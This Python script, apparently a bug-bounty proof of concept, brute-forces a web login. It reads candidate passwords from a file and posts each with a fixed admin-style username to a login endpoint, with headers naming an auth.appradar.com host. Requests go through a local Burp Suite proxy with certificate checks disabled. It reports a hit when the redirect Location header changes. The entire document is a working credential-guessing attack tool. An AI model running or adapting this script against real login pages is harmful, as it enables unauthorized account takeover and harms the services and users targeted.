import requests

# Target URL
url = "https://example.com/login"

# Headers
headers = {
    "Host": "auth.appradar.com",
    "Origin": "https://auth.appradar.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Connection": "keep-alive",
}

# Username to test
username = "bountypoc+admin@gmail.com"  # Plain text username

# Path to the password file
password_file = "passwords.txt"

# Burp Suite proxy configuration
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Disable SSL verification (since Burp Suite uses a self-signed certificate)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Initialize the password count
password_count = 0

# Read passwords from the file
with open(password_file, "r") as file:
    for password in file:
        password = password.strip()  # Remove any leading/trailing whitespace
        password_count += 1  # Increment the password count
        
        # Data payload
        data = {
            "username": username,
            "password": password
        }

        # Send POST request through the Burp Suite proxy
        response = requests.post(url, headers=headers, data=data, proxies=proxies, verify=False, allow_redirects=False)

        # Check the 'Location' header in the response
        location_header = response.headers.get('Location', '')

        # Print the attempt number and the password being tried
        # print(f"Attempt {password_count}: Trying password: {password}")

        if location_header == "https://auth.appradar.com/":
            print(f"Valid credentials found!\nUsername: {username}\nPassword: {password}")
            break
        elif location_header == "https://auth.appradar.com/login?error":
            print(f"{password_count} - Invalid password: {password}")
        else:
            print(f"Unexpected response for password {password}: {location_header}")
